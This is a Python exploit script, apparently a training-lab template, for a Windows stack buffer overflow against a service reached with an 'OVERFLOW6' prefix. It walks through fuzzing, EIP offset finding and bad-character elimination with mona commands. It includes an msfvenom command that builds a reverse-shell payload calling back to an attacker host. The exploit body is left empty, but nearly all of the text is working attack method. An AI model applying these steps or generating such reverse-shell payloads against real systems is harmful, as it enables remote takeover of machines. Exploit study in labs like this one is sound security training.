import buff


target = ("10.10.207.253", 1337)
runner = buff.Buff(target = target, prefix = "OVERFLOW6 ")


"""
FIRST CREATE WOKRING DIRECTORY!!!
!mona config -set workingfolder c:\mona\%p
"""



# ----- 1. FUZZING -----
# Crashed at 1100
# runner.fuzz()



# ----- 2. Send Unique Characters -----
# Set Buffer Size
BUFFER_SIZE = 1500
runner.setBufferSize(BUFFER_SIZE)

# runner.sendPattern()



# ----- 3. Find EIP Offset -----
"""
!mona findmsp -distance BUFFER_SIZE
"""
# offset = buff.generator.findPatternOffset(BUFFER_SIZE, "v1Av")
# print(offset)

# Set Eip offset
EIP_OFFSET = 1034
runner.setEipOffset(EIP_OFFSET)



# ----- 4. Find Bad Characters -----
"""
Possible: 23 24 3c 3d 83 84 ba

!mona bytearray -b "\x00\x08\x2c\xad"
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A2FA30
"""
# runner.sendBadChars(exclude = [
#     "\x08",
#     "\x2c",
#     "\xad"
# ])



# ----- 5. Send Exploit -----
"""
Find JMP ESP
!mona jmp -r esp -cpb "\x00\x23\x3c"

Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00\x23\x3c" -f c 
"""

# Set return address (in reverse)
# eip_address = ""
# runner.setEipAddress(eip_address)

# exploit = (

# )
# runner.setExploit(exploit)

# set padding
# runner.setPaddingSize(16)

# runner.sendExploit()
